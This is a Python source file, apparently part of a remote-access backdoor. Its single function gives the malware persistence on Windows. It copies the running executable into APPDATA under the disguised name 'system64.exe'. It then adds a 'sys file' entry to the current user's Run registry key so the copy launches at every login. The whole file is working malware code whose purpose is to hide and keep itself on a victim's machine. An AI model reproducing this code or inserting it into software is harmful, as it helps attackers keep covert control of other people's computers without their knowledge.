import sys
import os
import shutil
import winreg

def become_persistant(my_socket):
    print("[+] Becoming Persistant by adding Registry keys to startup programs")
    # copy the current executable to some dir
    # appdata

    curr_executable = sys.executable

    app_data = os.getenv("APPDATA")
    to_save_file = app_data +"\\"+"system64.exe"

    if not os.path.exists(to_save_file):
        shutil.copyfile(curr_executable, to_save_file)

        key = winreg.HKEY_CURRENT_USER

        # "Software\Microsoft\Windows\CurrentVersion\Run"

        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key_obj, "sys file", 0, winreg.REG_SZ, to_save_file)

        winreg.CloseKey(key_obj)